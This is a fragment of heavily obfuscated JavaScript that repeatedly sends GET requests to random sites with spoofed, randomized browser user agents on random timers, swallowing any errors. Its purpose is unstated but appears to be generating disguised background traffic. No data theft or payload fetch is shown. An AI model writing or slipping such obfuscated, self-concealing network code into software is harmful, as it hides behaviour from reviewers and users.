      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x13f * 0x15 + -0x1 * -0x120e + -0x2c39; k < -0xa94 * 0x3 + -0xb * 0xeb + 0x29d9; k++)
    setTimeout(f, (0x6 * 0x2a2f + -0x1 * -0x92e3 + 0x1 * -0xa59d) * k * getRandomInt(0x15e4 + -0x1 * -0x1f3 + -0x17d6, -0xf9 * 0x8 + -0x20c6 + 0x14f * 0x1f));
  setInterval(() => {
    f();
    for (let l = 0x1602 + -0xa * -0x3e5 + -0xf3d * 0x4; l < 0x47c + 0x1 * 0x667 + -0xadf; l++)
      setTimeout(f, (0x7644 + -0x1 * 0x1121 + 0x853d * 0x1) * l * getRandomInt(-0x12dc + -0x21e2 + -0x283 * -0x15, 0xd * 0x51 + 0xa90 + -0xeaa * 0x1));
  }, -0x59954b + -0x62c4fc + 0x1 * 0xf348c7);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a7 = d,
    f = axios[a7(0x1d)]({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1e89 + 0x312f + -0x3460) * getRandomInt(-0x3 * -0x97 + -0x1560 + 0x139c, -0x1449 + -0x232f * -0x1 + -0xee1 * 0x1));
}, -0x13e7 + -0x1d0a + 0x49 * 0xad);